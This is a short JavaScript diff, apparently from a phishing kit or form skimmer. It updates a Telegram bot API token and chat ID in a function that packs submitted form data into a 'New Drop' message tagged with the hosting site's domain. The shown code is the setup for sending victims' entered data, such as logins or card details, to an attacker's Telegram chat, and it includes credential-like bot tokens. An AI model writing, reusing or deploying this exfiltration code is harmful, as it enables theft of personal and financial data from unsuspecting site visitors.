@@ -48,8 +48,8 @@ function inspectExport(formdata, nextpage) {
     on_submit();
 
     let strings = formdata;
-    let apiToken = "6949871622:AAE3vV376qf5e6uYTdzn7fnQcjiM3c8";
-    let chatId = "71577704";
+    let apiToken = "6949871622:AAE_u4ho8WwKtWDWc11J7y_p4Cd7gcf6J3I";
+    let chatId = "7157725704";
     let message = `New Drop 🏆🏆🏆 %0A%0AFrom: ${window.location.host} %0A%0A`;
 
     Object.keys(strings).forEach(function (key) {
